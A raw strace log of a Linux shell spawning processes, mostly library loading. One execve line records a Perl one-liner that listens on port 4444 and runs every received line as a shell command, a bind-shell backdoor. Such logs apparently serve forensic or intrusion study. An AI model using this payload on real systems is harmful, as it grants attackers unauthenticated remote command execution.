\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
5496  07:09:19.782685 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
5496  07:09:19.782702 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de4000
5496  07:09:19.782714 mmap2(0xb7deb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7deb000
5496  07:09:19.782750 close(1)          = 0
5496  07:09:19.782763 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.782790 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
5496  07:09:19.782804 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
5496  07:09:19.782889 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
5496  07:09:19.782906 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dcc000
5496  07:09:19.782917 mmap2(0xb7de0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7de0000
5496  07:09:19.782932 mmap2(0xb7de2000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7de2000
5496  07:09:19.782946 close(1)          = 0
5496  07:09:19.782972 munmap(0xb7f72000, 29913) = 0
5496  07:09:19.783000 open("/etc/ld.so.cache", O_RDONLY) = 1
5496  07:09:19.783045 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5496  07:09:19.783090 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f72000
5496  07:09:19.783100 close(1)          = 0
5496  07:09:19.783111 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.783126 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
5496  07:09:19.783154 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5496  07:09:19.783241 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
5496  07:09:19.783258 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc2000
5496  07:09:19.783269 mmap2(0xb7dca000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dca000
5496  07:09:19.783286 close(1)          = 0
5496  07:09:19.783298 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.783311 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
5496  07:09:19.783325 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5496  07:09:19.783412 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5496  07:09:19.783429 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db7000
5496  07:09:19.783440 mmap2(0xb7dc0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dc0000
5496  07:09:19.783456 close(1)          = 0
5496  07:09:19.783476 munmap(0xb7f72000, 29913) = 0
5496  07:09:19.783502 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
5496  07:09:19.783539 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5496  07:09:19.783565 _llseek(1, 0, [0], SEEK_CUR) = 0
5496  07:09:19.783577 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
5496  07:09:19.783593 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f79000
5496  07:09:19.783604 _llseek(1, 1624, [1624], SEEK_SET) = 0
5496  07:09:19.783623 munmap(0xb7f79000, 1624) = 0
5496  07:09:19.783633 close(1)          = 0
5496  07:09:19.783662 getpgrp()         = 3831
5496  07:09:19.783672 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
5496  07:09:19.783687 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
5496  07:09:19.783704 brk(0x8101000)    = 0x8101000
5496  07:09:19.783736 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5496  07:09:19.783750 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5496  07:09:19.783764 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5496  07:09:19.783801 brk(0x8102000)    = 0x8102000
5496  07:09:19.783827 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5496  07:09:19.783845 stat64("/sbin/AB", 0xbf83de98) = -1 ENOENT (No such file or directory)
5496  07:09:19.783858 stat64("/bin/AB", 0xbf83de98) = -1 ENOENT (No such file or directory)
5496  07:09:19.783869 stat64("/usr/sbin/AB", 0xbf83de98) = -1 ENOENT (No such file or directory)
5496  07:09:19.783881 stat64("/usr/bin/AB", 0xbf83de98) = -1 ENOENT (No such file or directory)
5496  07:09:19.783894 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5496  07:09:19.783909 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7ded6f8) = 5497
5497  07:09:19.783953 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5497  07:09:19.783969 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5497  07:09:19.783993 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5497  07:09:19.784027 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5497  07:09:19.784058 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5497  07:09:19.784074 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5497  07:09:19.784087 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5497  07:09:19.784156 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
5497  07:09:19.784170 --- SIGPIPE (Broken pipe) @ 0 (0) ---
5497  07:09:19.784237 exit_group(127)   = ?
5496  07:09:19.799453 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5496  07:09:19.799520 --- SIGCHLD (Child exited) @ 0 (0) ---
5496  07:09:19.799549 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 5497
5496  07:09:19.799565 waitpid(-1, 0xbf83db18, WNOHANG) = -1 ECHILD (No child processes)
5496  07:09:19.799575 sigreturn()       = ? (mask now [])
5496  07:09:19.799598 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5496  07:09:19.799612 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5496  07:09:19.799623 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5496  07:09:19.799635 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5496  07:09:19.799653 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5496  07:09:19.799665 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5496  07:09:19.799697 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5496  07:09:19.799717 stat64("/sbin/perl", 0xbf83dec8) = -1 ENOENT (No such file or directory)
5496  07:09:19.799729 stat64("/bin/perl", 0xbf83dec8) = -1 ENOENT (No such file or directory)
5496  07:09:19.799740 stat64("/usr/sbin/perl", 0xbf83dec8) = -1 ENOENT (No such file or directory)
5496  07:09:19.799752 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5496  07:09:19.799770 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5496  07:09:19.799793 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5496  07:09:19.799808 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7ded6f8) = 5498
4519  07:09:19.799841 waitpid(5496,  <unfinished ...>
5498  07:09:19.799862 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5498  07:09:19.799878 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5498  07:09:19.799891 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5498  07:09:19.799903 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5498  07:09:19.799919 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5498  07:09:19.799946 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5498  07:09:19.799988 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5498  07:09:19.800069 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
5498  07:09:19.800154 brk(0)            = 0x8153000
5498  07:09:19.800173 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5498  07:09:19.800188 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f79000
5498  07:09:19.800203 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5498  07:09:19.800219 open("/etc/ld.so.cache", O_RDONLY) = 1
5498  07:09:19.800232 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5498  07:09:19.800248 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f71000
5498  07:09:19.800258 close(1)          = 0
5498  07:09:19.800269 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5498  07:09:19.800285 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5498  07:09:19.800299 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5498  07:09:19.800388 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5498  07:09:19.800405 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f6d000
5498  07:09:19.800417 mmap2(0xb7f6f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f6f000
5498  07:09:19.800444 close(1)          = 0
5498  07:09:19.800484 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5498  07:09:19.800498 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
5498  07:09:19.800529 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
5498  07:09:19.800614 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
5498  07:09:19.800631 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f48000
5498  07:09:19.800645 mmap2(0xb7f6b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f6b000
5498  07:09:19.800661 close(1)          = 0
5498  07:09:19.800672 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5498  07:09:19.800686 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
5498  07:09:19.800700 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
5498  07:09:19.800784 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
5498  07:09:19.800800 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f47000
5498  07:09:19.800813 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f2f000
5498  07:09:19.800823 mmap2(0xb7f43000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f43000
5498  07:09:19.800837 mmap2(0xb7f45000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f45000
5498  07:09:19.800851 close(1)          = 0
5498  07:09:19.800862 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5498  07:09:19.800875 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5498  07:09:19.800889 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5498  07:09:19.801032 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5498  07:09:19.801051 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de0000
5498  07:09:19.801062 mmap2(0xb7f29000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f29000
5498  07:09:19.801076 mmap2(0xb7f2c000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f2c000
5498  07:09:19.801089 close(1)          = 0
5498  07:09:19.801102 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5498  07:09:19.801115 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
5498  07:09:19.801132 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 